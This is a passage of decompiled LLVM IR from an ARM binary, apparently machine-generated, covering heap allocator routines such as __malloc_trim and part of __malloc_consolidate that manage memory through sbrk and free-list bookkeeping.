  %v0_13484.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %dec_label_pc_13478.dec_label_pc_13484_crit_edge, %dec_label_pc_133e4
  %v0_13484 = phi i32 [ %v0_13484.pre, %dec_label_pc_13478.dec_label_pc_13484_crit_edge ], [ %v0_131ec, %dec_label_pc_133e4 ]
  store i32 %v0_13484, i32* @r4, align 4
  br label %dec_label_pc_134b0

dec_label_pc_1348c:                               ; preds = %dec_label_pc_13478
  %v1_1348c = add i32 %v0_13478, -7
  store i32 %v1_1348c, i32* %r0.global-to-local, align 4
  %v1_13490 = call i32 @malloc(i32 %v1_1348c)
  store i32 %v1_13490, i32* @r0, align 4
  store i32 %v1_13490, i32* @r4, align 4
  %v2_13494 = icmp eq i32 %v1_13490, 0
  br i1 %v2_13494, label %dec_label_pc_134b0, label %dec_label_pc_1349c

dec_label_pc_1349c:                               ; preds = %dec_label_pc_1348c
  %v0_1349c = load i32, i32* @r6, align 4
  %v1_1349c = add i32 %v0_1349c, -8
  store i32 %v1_1349c, i32* @r2, align 4
  %v0_134a0 = load i32, i32* @r5, align 4
  store i32 %v0_134a0, i32* @r1, align 4
  %v0_134a4 = call i32 @memcpy()
  %v0_134a8 = load i32, i32* @r5, align 4
  store i32 %v0_134a8, i32* @r0, align 4
  %v0_134ac = call i32 @free()
  store i32 %v0_134ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134b0

dec_label_pc_134b0:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_1348c, %dec_label_pc_13484, %dec_label_pc_133dc, %.thread6, %dec_label_pc_1324c, %dec_label_pc_1349c
  store i32 %v2_131a0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  %v4_134c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 24) to i32*), align 4
  store i32 %v4_134c0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_134c0)
  br label %dec_label_pc_134cc

dec_label_pc_134cc:                               ; preds = %dec_label_pc_131d4, %dec_label_pc_1317c, %dec_label_pc_13164, %dec_label_pc_134b0
  %v0_134cc = load i32, i32* @r4, align 4
  store i32 %v0_134cc, i32* %r0.global-to-local, align 4
  store i32 %v3_13144, i32* @r4, align 4
  store i32 %v6_13144, i32* @r5, align 4
  store i32 %v9_13144, i32* @r6, align 4
  store i32 %v12_13144, i32* @r7, align 4
  store i32 %v15_13144, i32* @r8, align 4
  store i32 %v18_13144, i32* @sb, align 4
  store i32 %v21_13144, i32* @sl, align 4
  store i32 %v24_13144, i32* @fp, align 4
  store i32 %v27_13144, i32* @lr, align 4
  ret i32 %v0_134cc

; uselistorder directives
  uselistorder i32 %v2_13464, { 1, 0, 2 }
  uselistorder i32 %v2_1344c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13428, { 1, 0, 2 }
  uselistorder i32 %v3_13408, { 1, 0, 2, 3 }
  uselistorder i32 %v1_133ac, { 2, 1, 0 }
  uselistorder i32 %v2_1337c, { 1, 0, 2 }
  uselistorder i32 %v0_13310, { 1, 0 }
  uselistorder i32 %v1_132cc, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_13230, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13228, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_1320c, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_13204, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_13200, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_131f0, { 1, 0 }
  uselistorder i32 %v0_131ec, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_131cc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 22, 13, 15, 14, 16, 23, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_134cc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_134b0, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_133dc, { 1, 0 }
  uselistorder label %dec_label_pc_1337c, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_132c8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_132bc, { 1, 0 }
  uselistorder label %dec_label_pc_132b8, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_134e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_134e0:
  %v0_134e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_134e0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_134e0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_134e0, %bb
  %v10_134f4 = phi i32 [ %arg1, %dec_label_pc_134e0 ], [ 0, %bb ]
  ret i32 %v10_134f4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_134f8 = add i32 %arg2, 44
  %v2_134f8 = inttoptr i32 %v1_134f8 to i32*
  %v3_134f8 = load i32, i32* %v2_134f8, align 4
  %v12_134fc = load i32, i32* @r7, align 4
  %v1_13500 = add i32 %v3_134f8, 4
  %v2_13500 = inttoptr i32 %v1_13500 to i32*
  %v3_13500 = load i32, i32* %v2_13500, align 4
  %v1_13504 = add i32 %arg2, 860
  %v2_13504 = inttoptr i32 %v1_13504 to i32*
  %v3_13504 = load i32, i32* %v2_13504, align 4
  store i32 %v3_13504, i32* @r4, align 4
  %v1_13508 = and i32 %v3_13500, -4
  store i32 %v1_13508, i32* @r6, align 4
  %v1_1350c = add i32 %v1_13508, -17
  %v2_13510 = add i32 %v1_1350c, %v3_13504
  store i32 %arg2, i32* @r5, align 4
  %v2_1351c = sub i32 %v2_13510, %arg1
  store i32 %v3_13504, i32* %r1.global-to-local, align 4
  %v2_13524 = udiv i32 %v2_1351c, %v3_13504
  %v1_13528 = add i32 %v2_13524, -1
  store i32 %v1_13528, i32* %r0.global-to-local, align 4
  %v2_1352c = mul i32 %v1_13528, %v3_13504
  store i32 %v2_1352c, i32* @r7, align 4
  %v2_13530 = icmp eq i32 %v2_1352c, 0
  store i1 %v2_13530, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_1352c, 1
  br i1 %tmp8, label %dec_label_pc_13598, label %dec_label_pc_13538

dec_label_pc_13538:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1353c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1353c, i32* %r0.global-to-local, align 4
  %v0_13540 = load i32, i32* @r5, align 4
  %v1_13540 = add i32 %v0_13540, 44
  %v2_13540 = inttoptr i32 %v1_13540 to i32*
  %v3_13540 = load i32, i32* %v2_13540, align 4
  %v0_13544 = load i32, i32* @r6, align 4
  %v2_13544 = add i32 %v0_13544, %v3_13540
  %v9_13548 = icmp eq i32 %v1_1353c, %v2_13544
  store i1 %v9_13548, i1* @cpsr_z, align 1
  store i32 %v1_1353c, i32* @r4, align 4
  br i1 %v9_13548, label %dec_label_pc_13554, label %dec_label_pc_13598

dec_label_pc_13554:                               ; preds = %dec_label_pc_13538
  %v0_13554 = load i32, i32* @r7, align 4
  %v1_13554 = sub i32 0, %v0_13554
  store i32 %v1_13554, i32* %r0.global-to-local, align 4
  %v1_13558 = call i32 @__GI_sbrk(i32 %v1_13554)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13560 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13560, i32* %r0.global-to-local, align 4
  %v7_13564 = icmp eq i32 %v1_13560, -1
  store i1 %v7_13564, i1* @cpsr_z, align 1
  br i1 %v7_13564, label %dec_label_pc_13598, label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_13554
  %v0_1356c = load i32, i32* @r4, align 4
  %v2_1356c = sub i32 %v0_1356c, %v1_13560
  store i32 %v2_1356c, i32* %r0.global-to-local, align 4
  %v9_1356c = icmp eq i32 %v0_1356c, %v1_13560
  store i1 %v9_1356c, i1* @cpsr_z, align 1
  br i1 %v9_1356c, label %dec_label_pc_13598, label %dec_label_pc_13574

dec_label_pc_13574:                               ; preds = %dec_label_pc_1356c
  %v0_13574 = load i32, i32* @r5, align 4
  %v1_13574 = add i32 %v0_13574, 872
  %v2_13574 = inttoptr i32 %v1_13574 to i32*
  %v3_13574 = load i32, i32* %v2_13574, align 4
  %v1_13578 = load i32, i32* @r6, align 4
  %v2_13578 = sub i32 %v1_13578, %v2_1356c
  store i32 %v2_13578, i32* %r2.global-to-local, align 4
  %v1_1357c = add i32 %v0_13574, 44
  %v2_1357c = inttoptr i32 %v1_1357c to i32*
  %v3_1357c = load i32, i32* %v2_1357c, align 4
  store i32 %v3_1357c, i32* %r1.global-to-local, align 4
  %v2_13580 = sub i32 %v3_13574, %v2_1356c
  %v1_13584 = or i32 %v2_13578, 1
  store i32 %v1_13584, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_13580, i32* %v2_13574, align 4
  %v0_13590 = load i32, i32* %r2.global-to-local, align 4
  %v1_13590 = load i32, i32* %r1.global-to-local, align 4
  %v2_13590 = add i32 %v1_13590, 4
  %v3_13590 = inttoptr i32 %v2_13590 to i32*
  store i32 %v0_13590, i32* %v3_13590, align 4
  %v1_135a4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1359c

dec_label_pc_13598:                               ; preds = %dec_label_pc_13538, %dec_label_pc_1356c, %dec_label_pc_13554, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1359c

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13574, %dec_label_pc_13598
  %v1_135a4 = phi i32 [ %v1_135a4.pre, %dec_label_pc_13574 ], [ 0, %dec_label_pc_13598 ]
  store i32 %v12_134fc, i32* @r7, align 4
  ret i32 %v1_135a4

; uselistorder directives
  uselistorder i1 %v7_13564, { 1, 0 }
  uselistorder i32 %v1_13560, { 2, 1, 0, 3 }
  uselistorder i32 %v3_13504, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1359c, { 1, 0 }
  uselistorder label %dec_label_pc_13598, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_135a8 = load i32, i32* @r4, align 4
  store i32 %v3_135a8, i32* %stack_var_-36, align 4
  %v0_135ac = load i32, i32* @r0, align 4
  %v1_135ac = inttoptr i32 %v0_135ac to i32*
  %v2_135ac = load i32, i32* %v1_135ac, align 4
  store i32 %v2_135ac, i32* %r3.global-to-local, align 4
  %v2_135b0 = icmp eq i32 %v2_135ac, 0
  store i32 %v0_135ac, i32* @r4, align 4
  br i1 %v2_135b0, label %dec_label_pc_136e8.preheader, label %dec_label_pc_135c4

dec_label_pc_136e8.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_136f025 = add i32 %v0_135ac, 52
  store i32 %v1_136f025, i32* %r3.global-to-local, align 4
  %v2_136f826 = add i32 %v0_135ac, 60
  %v3_136f827 = inttoptr i32 %v2_136f826 to i32*
  store i32 %v1_136f025, i32* %v3_136f827, align 4
  %v0_136fc28 = load i32, i32* %r3.global-to-local, align 4
  %v2_136fc29 = add i32 %v0_136fc28, 12
  %v3_136fc30 = inttoptr i32 %v2_136fc29 to i32*
  store i32 %v0_136fc28, i32* %v3_136fc30, align 4
  br label %dec_label_pc_136e8.dec_label_pc_136e8_crit_edge

dec_label_pc_135c4:                               ; preds = %entry
  %v1_135c4 = and i32 %v2_135ac, -3
  %v3_135c8 = udiv i32 %v2_135ac, 8
  store i32 %v3_135c8, i32* %r2.global-to-local, align 4
  store i32 %v1_135c4, i32* %v1_135ac, align 4
  %v0_135d0 = load i32, i32* @r0, align 4
  %v1_135d0 = add i32 %v0_135d0, -4
  store i32 %v1_135d0, i32* %r3.global-to-local, align 4
  %v1_135d4 = load i32, i32* %r2.global-to-local, align 4
  %v4_135d4 = mul i32 %v1_135d4, 4
  %v5_135d4 = add i32 %v4_135d4, %v1_135d0
  store i32 %v5_135d4, i32* %sb.global-to-local, align 4
  %v1_135d8 = add i32 %v0_135d0, 52
  store i32 %v1_135d8, i32* %r7.global-to-local, align 4
  %v1_135dc = add i32 %v0_135d0, 4
  store i32 %v1_135dc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_135e4

dec_label_pc_135e4:                               ; preds = %dec_label_pc_136e0, %dec_label_pc_135c4
  %v1_136d810 = phi i32 [ %v1_136d8, %dec_label_pc_136e0 ], [ %v5_135d4, %dec_label_pc_135c4 ]
  %v1_135f0 = phi i32 [ %v1_136e0, %dec_label_pc_136e0 ], [ %v1_135dc, %dec_label_pc_135c4 ]
  %v1_135e4 = inttoptr i32 %v1_135f0 to i32*
  %v2_135e4 = load i32, i32* %v1_135e4, align 4
  store i32 %v2_135e4, i32* %r1.global-to-local, align 4
  %v2_135e8 = icmp eq i32 %v2_135e4, 0
  br i1 %v2_135e8, label %dec_label_pc_136d8, label %dec_label_pc_135f0

dec_label_pc_135f0:                               ; preds = %dec_label_pc_135e4
  %v0_135f0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_135f0, i32* %v1_135e4, align 4
  %v0_135f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_135f4

dec_label_pc_135f4:                               ; preds = %dec_label_pc_136cc, %dec_label_pc_135f0
  %v0_13610 = phi i32 [ %v0_136cc, %dec_label_pc_136cc ], [ %v0_135f4.pre, %dec_label_pc_135f0 ]
  %v1_135f4 = add i32 %v0_13610, 4
  %v2_135f4 = inttoptr i32 %v1_135f4 to i32*
  %v3_135f4 = load i32, i32* %v2_135f4, align 4
  store i32 %v3_135f4, i32* %r3.global-to-local, align 4
  %v1_135f8 = and i32 %v3_135f4, -2
  store i32 %v1_135f8, i32* %lr.global-to-local, align 4
  %v2_135fc = add i32 %v1_135f8, %v0_13610
  store i32 %v2_135fc, i32* @r0, align 4
  %v1_13600 = urem i32 %v3_135f4, 2
  %v2_13600 = icmp eq i32 %v1_13600, 0
  %v1_13604 = add i32 %v0_13610, 8
  %v2_13604 = inttoptr i32 %v1_13604 to i32*
  %v3_13604 = load i32, i32* %v2_13604, align 4
  store i32 %v3_13604, i32* %sl.global-to-local, align 4
  %v1_13608 = add i32 %v2_135fc, 4
  %v2_13608 = inttoptr i32 %v1_13608 to i32*
  %v3_13608 = load i32, i32* %v2_13608, align 4
  store i32 %v3_13608, i32* %r8.global-to-local, align 4
  br i1 %v2_13600, label %dec_label_pc_13610, label %dec_label_pc_13644

dec_label_pc_13610:                               ; preds = %dec_label_pc_135f4
  %v1_13610 = inttoptr i32 %v0_13610 to i32*
  %v2_13610 = load i32, i32* %v1_13610, align 4
  store i32 %v2_13610, i32* %r5.global-to-local, align 4
  %v2_13614 = sub i32 %v0_13610, %v2_13610
  store i32 %v2_13614, i32* %r3.global-to-local, align 4
  %v1_13618 = add i32 %v2_13614, 8
  %v2_13618 = inttoptr i32 %v1_13618 to i32*
  %v3_13618 = load i32, i32* %v2_13618, align 4
  store i32 %v3_13618, i32* %ip.global-to-local, align 4
  %v1_1361c = add i32 %v3_13618, 12
  %v2_1361c = inttoptr i32 %v1_1361c to i32*
  %v3_1361c = load i32, i32* %v2_1361c, align 4
  store i32 %v3_1361c, i32* %r1.global-to-local, align 4
  %v9_13620 = icmp eq i32 %v3_1361c, %v2_13614
  %v1_13624 = add i32 %v2_13614, 12
  %v2_13624 = inttoptr i32 %v1_13624 to i32*
  %v3_13624 = load i32, i32* %v2_13624, align 4
  store i32 %v3_13624, i32* %r2.global-to-local, align 4
  br i1 %v9_13620, label %dec_label_pc_1362c, label %dec_label_pc_13688

dec_label_pc_1362c:                               ; preds = %dec_label_pc_13610
  %v1_1362c = add i32 %v3_13624, 8
  %v2_1362c = inttoptr i32 %v1_1362c to i32*
  %v3_1362c = load i32, i32* %v2_1362c, align 4
  store i32 %v3_1362c, i32* %r3.global-to-local, align 4
  %v9_13630 = icmp eq i32 %v3_1362c, %v2_13614
  br i1 %v9_13630, label %dec_label_pc_13638, label %dec_label_pc_13688

dec_label_pc_13638:                               ; preds = %dec_label_pc_1362c
  store i32 %v3_13618, i32* %v2_1362c, align 4
  %v0_1363c = load i32, i32* %r2.global-to-local, align 4
  %v1_1363c = load i32, i32* %ip.global-to-local, align 4
  %v2_1363c = add i32 %v1_1363c, 12
  %v3_1363c = inttoptr i32 %v2_1363c to i32*
  store i32 %v0_1363c, i32* %v3_1363c, align 4
  %v0_13640 = load i32, i32* %lr.global-to-local, align 4
  %v1_13640 = load i32, i32* %r5.global-to-local, align 4
  %v2_13640 = add i32 %v1_13640, %v0_13640
  store i32 %v2_13640, i32* %lr.global-to-local, align 4
  %v0_13648.pre = load i32, i32* @r0, align 4
  %v0_1364c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13644

dec_label_pc_13644:                               ; preds = %dec_label_pc_135f4, %dec_label_pc_13638
  %v0_136bc = phi i32 [ %v1_135f8, %dec_label_pc_135f4 ], [ %v2_13640, %dec_label_pc_13638 ]
  %v0_1364c = phi i32 [ %v3_13608, %dec_label_pc_135f4 ], [ %v0_1364c.pre, %dec_label_pc_13638 ]
  %v1_13660 = phi i32 [ %v2_135fc, %dec_label_pc_135f4 ], [ %v0_13648.pre, %dec_label_pc_13638 ]
  %v0_13644 = load i32, i32* @r4, align 4
  %v1_13644 = add i32 %v0_13644, 44
  %v2_13644 = inttoptr i32 %v1_13644 to i32*
  %v3_13644 = load i32, i32* %v2_13644, align 4
  store i32 %v3_13644, i32* %r3.global-to-local, align 4
  %v9_13648 = icmp eq i32 %v1_13660, %v3_13644
  %v1_1364c = and i32 %v0_1364c, -4
  store i32 %v1_1364c, i32* %r5.global-to-local, align 4
  br i1 %v9_13648, label %dec_label_pc_136bc, label %dec_label_pc_13654

dec_label_pc_13654:                               ; preds = %dec_label_pc_13644
  %v2_13654 = add i32 %v1_13660, %v1_1364c
  store i32 %v2_13654, i32* %r3.global-to-local, align 4
  %v1_13658 = add i32 %v2_13654, 4
  %v2_13658 = inttoptr i32 %v1_13658 to i32*
  %v3_13658 = load i32, i32* %v2_13658, align 4
  store i32 %v3_13658, i32* %r3.global-to-local, align 4
  %v1_1365c = urem i32 %v3_13658, 2
  %v2_1365c = icmp eq i32 %v1_1365c, 0
  %v2_13660 = add i32 %v1_13660, 4
  %v3_13660 = inttoptr i32 %v2_13660 to i32*
  store i32 %v1_1364c, i32* %v3_13660, align 4
  br i1 %v2_1365c, label %dec_label_pc_13668, label %dec_label_pc_13654.dec_label_pc_13698_crit_edge

dec_label_pc_13654.dec_label_pc_13698_crit_edge:  ; preds = %dec_label_pc_13654
  %v0_1369c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13698

dec_label_pc_13668:                               ; preds = %dec_label_pc_13654
  %v0_13668 = load i32, i32* @r0, align 4
  %v1_13668 = add i32 %v0_13668, 8
  %v2_13668 = inttoptr i32 %v1_13668 to i32*
  %v3_13668 = load i32, i32* %v2_13668, align 4
  store i32 %v3_13668, i32* %ip.global-to-local, align 4
  %v1_1366c = add i32 %v3_13668, 12
  %v2_1366c = inttoptr i32 %v1_1366c to i32*
  %v3_1366c = load i32, i32* %v2_1366c, align 4
  store i32 %v3_1366c, i32* %r3.global-to-local, align 4
  %v9_13670 = icmp eq i32 %v3_1366c, %v0_13668
  %v1_13674 = add i32 %v0_13668, 12
  %v2_13674 = inttoptr i32 %v1_13674 to i32*
  %v3_13674 = load i32, i32* %v2_13674, align 4
  store i32 %v3_13674, i32* %r2.global-to-local, align 4
  br i1 %v9_13670, label %dec_label_pc_1367c, label %dec_label_pc_13688

dec_label_pc_1367c:                               ; preds = %dec_label_pc_13668
  %v1_1367c = add i32 %v3_13674, 8
  %v2_1367c = inttoptr i32 %v1_1367c to i32*
  %v3_1367c = load i32, i32* %v2_1367c, align 4
  store i32 %v3_1367c, i32* %r3.global-to-local, align 4
  %v9_13680 = icmp eq i32 %v3_1367c, %v0_13668
  br i1 %v9_13680, label %dec_label_pc_1368c, label %dec_label_pc_13688

dec_label_pc_13688:                               ; preds = %dec_label_pc_13668, %dec_label_pc_1362c, %dec_label_pc_13610, %dec_label_pc_1367c
  %v0_13688 = call i32 @abort()
  store i32 %v0_13688, i32* @r0, align 4
  %v0_1368c.pre = load i32, i32* @ip, align 4
  %v1_1368c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1368c

dec_label_pc_1368c:                               ; preds = %dec_label_pc_1367c, %dec_label_pc_13688
  %v1_1368c = phi i32 [ %v3_13674, %dec_label_pc_1367c ], [ %v1_1368c.pre, %dec_label_pc_13688 ]
  %v0_1368c = phi i32 [ %v3_13668, %dec_label_pc_1367c ], [ %v0_1368c.pre, %dec_label_pc_13688 ]
  %v2_1368c = add i32 %v1_1368c, 8
  %v3_1368c = inttoptr i32 %v2_1368c to i32*
  store i32 %v0_1368c, i32* %v3_1368c, align 4
  %v0_13690 = load i32, i32* %r2.global-to-local, align 4
  %v1_13690 = load i32, i32* %ip.global-to-local, align 4
  %v2_13690 = add i32 %v1_13690, 12
  %v3_13690 = inttoptr i32 %v2_13690 to i32*
  store i32 %v0_13690, i32* %v3_13690, align 4
  %v0_13694 = load i32, i32* %lr.global-to-local, align 4
  %v1_13694 = load i32, i32* %r5.global-to-local, align 4
  %v2_13694 = add i32 %v1_13694, %v0_13694
  store i32 %v2_13694, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13698

dec_label_pc_13698:                               ; preds = %dec_label_pc_13654.dec_label_pc_13698_crit_edge, %dec_label_pc_1368c
  %v0_1369c = phi i32 [ %v0_1369c.pre, %dec_label_pc_13654.dec_label_pc_13698_crit_edge ], [ %v2_13694, %dec_label_pc_1368c ]
  %v0_13698 = load i32, i32* %r7.global-to-local, align 4
  %v1_13698 = add i32 %v0_13698, 8
  %v2_13698 = inttoptr i32 %v1_13698 to i32*
  %v3_13698 = load i32, i32* %v2_13698, align 4
  store i32 %v3_13698, i32* %r2.global-to-local, align 4
  %v1_1369c = or i32 %v0_1369c, 1
  store i32 %v1_1369c, i32* %r3.global-to-local, align 4
  %v0_136a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_136a0, i32* %v2_13698, align 4
  %v0_136a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_136a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_136a4 = add i32 %v1_136a4, 12
  %v3_136a4 = inttoptr i32 %v2_136a4 to i32*
  store i32 %v0_136a4, i32* %v3_136a4, align 4
  %v0_136a8 = load i32, i32* %lr.global-to-local, align 4
  %v1_136a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_136a8 = add i32 %v1_136a8, %v0_136a8
  %v4_136a8 = inttoptr i32 %v3_136a8 to i32*
  store i32 %v0_136a8, i32* %v4_136a8, align 4
  %v0_136ac = load i32, i32* %r3.global-to-local, align 4
  %v1_136ac = load i32, i32* %r1.global-to-local, align 4
  %v2_136ac = add i32 %v1_136ac, 4
  %v3_136ac = inttoptr i32 %v2_136ac to i32*
  store i32 %v0_136ac, i32* %v3_136ac, align 4
  %v0_136b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_136b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_136b0 = add i32 %v1_136b0, 8
  %v3_136b0 = inttoptr i32 %v2_136b0 to i32*
  store i32 %v0_136b0, i32* %v3_136b0, align 4
  %v0_136b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_136b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_136b4 = add i32 %v1_136b4, 12
  %v3_136b4 = inttoptr i32 %v2_136b4 to i32*
  store i32 %v0_136b4, i32* %v3_136b4, align 4
  br label %dec_label_pc_136cc

dec_label_pc_136bc:                               ; preds = %dec_label_pc_13644
  %v2_136bc = add i32 %v1_1364c, %v0_136bc
  %v1_136c0 = or i32 %v2_136bc, 1
  store i32 %v1_136c0, i32* %r3.global-to-local, align 4
  %v1_136c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_136c4 = add i32 %v1_136c4, 4
  %v3_136c4 = inttoptr i32 %v2_136c4 to i32*
  store i32 %v1_136c0, i32* %v3_136c4, align 4
  %v0_136c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_136c8 = load i32, i32* @r4, align 4
  %v2_136c8 = add i32 %v1_136c8, 44
  %v3_136c8 = inttoptr i32 %v2_136c8 to i32*
  store i32 %v0_136c8, i32* %v3_136c8, align 4
  br label %dec_label_pc_136cc

dec_label_pc_136cc:                               ; preds = %dec_label_pc_13698, %dec_label_pc_136bc
  %v0_136cc = load i32, i32* %sl.global-to-local, align 4
  %v2_136cc = icmp eq i32 %v0_136cc, 0
  store i32 %v0_136cc, i32* %r1.global-to-local, align 4
  br i1 %v2_136cc, label %dec_label_pc_136d8.loopexit, label %dec_label_pc_135f4

dec_label_pc_136d8.loopexit:                      ; preds = %dec_label_pc_136cc
  %v0_136d8.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_136d8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_136d8

dec_label_pc_136d8:                               ; preds = %dec_label_pc_136d8.loopexit, %dec_label_pc_135e4
  %v1_136d8 = phi i32 [ %v1_136d8.pre, %dec_label_pc_136d8.loopexit ], [ %v1_136d810, %dec_label_pc_135e4 ]
  %v0_136e0 = phi i32 [ %v0_136d8.pre, %dec_label_pc_136d8.loopexit ], [ %v1_135f0, %dec_label_pc_135e4 ]
  %v9_136d8 = icmp eq i32 %v0_136e0, %v1_136d8
  br i1 %v9_136d8, label %dec_label_pc_13750, label %dec_label_pc_136e0

dec_label_pc_136e0:                               ; preds = %dec_label_pc_136d8
  %v1_136e0 = add i32 %v0_136e0, 4
  store i32 %v1_136e0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_135e4

dec_label_pc_136e8.dec_label_pc_136e8_crit_edge:  ; preds = %dec_label_pc_136e8.preheader, %dec_label_pc_136e8.dec_label_pc_136e8_crit_edge
  %v0_136e8.pre = load i32, i32* @r4, align 4
  %v1_136e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_136e8 = mul i32 %v1_136e8.pre, 8
  %v5_136e8 = add i32 %v4_136e8, %v0_136e8.pre
  %v1_136ec = add i32 %v1_136e8.pre, 1
  store i32 %v1_136ec, i32* %r2.global-to-local, align 4
  %v1_136f0 = add i32 %v5_136e8, 44
  store i32 %v1_136f0, i32* %r3.global-to-local, align 4
  %v2_136f8 = add i32 %v5_136e8, 52
  %v3_136f8 = inttoptr i32 %v2_136f8 to i32*
  store i32 %v1_136f0, i32* %v3_136f8, align 4
  %v0_136fc = load i32, i32* %r3.global-to-local, align 4
  %v2_136fc = add i32 %v0_136fc, 12
  %v3_136fc = inttoptr i32 %v2_136fc to i32*
  store i32 %v0_136fc, i32* %v3_136fc, align 4
  %v7_13700 = icmp sgt i32 %v1_136ec, 95
  br i1 %v7_13700, label %dec_label_pc_13704, label %dec_label_pc_136e8.dec_label_pc_136e8_crit_edge

dec_label_pc_13704:                               ; preds = %dec_label_pc_136e8.dec_label_pc_136e8_crit_edge
  %v0_13704 = load i32, i32* @r4, align 4
  %v1_13704 = inttoptr i32 %v0_13704 to i32*
  %v2_13704 = load i32, i32* %v1_13704, align 4
  store i32 %v2_13704, i32* %r2.global-to-local, align 4
  %v1_13708 = add i32 %v0_13704, 864
